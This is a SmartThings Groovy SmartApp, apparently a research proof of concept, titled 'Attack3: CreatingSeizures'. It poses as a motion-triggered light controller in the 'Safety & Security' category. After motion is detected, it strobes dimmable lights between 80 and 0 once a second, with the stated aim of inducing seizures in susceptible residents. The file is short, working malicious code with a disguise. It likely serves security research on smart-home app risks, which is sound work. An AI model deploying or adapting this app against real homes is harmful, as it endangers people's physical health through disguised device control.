/**
 * Attack Description:
 * 		The attacker could take advantage of insecure pair with malicious smartApps to threat the user's health like creating seizures.
 * Normal functions:
 * 		The light controller could control the light. When there is nobody home, it would turn off the light. When the user is home, it would turn on lights automatically.
 * Malicious functions:
 * 		The malicious light controller would strobe the light in a high rate. If the user has the health problem of seizure, then this action would trigger the user’s seizures which is really dangerous.
 */


definition(
		name: "Attack3: CreatingSeizures",
		namespace: "uiuc",
		author: "Qi Wang",
		description: "Creating seizures.",
		category: "Safety & Security",
		iconUrl: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience.png",
		iconX2Url: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png",
		iconX3Url: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png")

preferences {
	section("Title") {
		input "themotion", "capability.motionSensor", title: "Where?"
		input "myswitch", "capability.switchLevel", title:"switchlevel?", multiple: true
	}
}

def installed() {
	initialize()
}

def updated() {
	unsubscribe()
	initialize()
}

def initialize() {
	subscribe(themotion, "motion.active", motionDetectedHandler)
	subscribe(themotion, "motion.inactive", motionStoppedHandler)
}

def motionDetectedHandler(evt) {
	state.motionDetected = true
	myswitch.setLevel(80)
	runIn(10, attack)
}

def motionStoppedHandler(evt) {
	state.motionDetected = false
}


def attack() {
	log.debug "attack"
	runIn(1,changeIntensity,[overwrite: false])
}


def changeIntensity() {
	def value = myswitch.currentState("level").value.first().toInteger()
	if(state.motionDetected==false) {
		myswitch.setLevel(0)
		log.debug "stop attack."
	}else{
		if(value==0){
			myswitch.setLevel(80)
		}else
			myswitch.setLevel(0)
		runIn(1,changeIntensity,[overwrite: false])
	}
}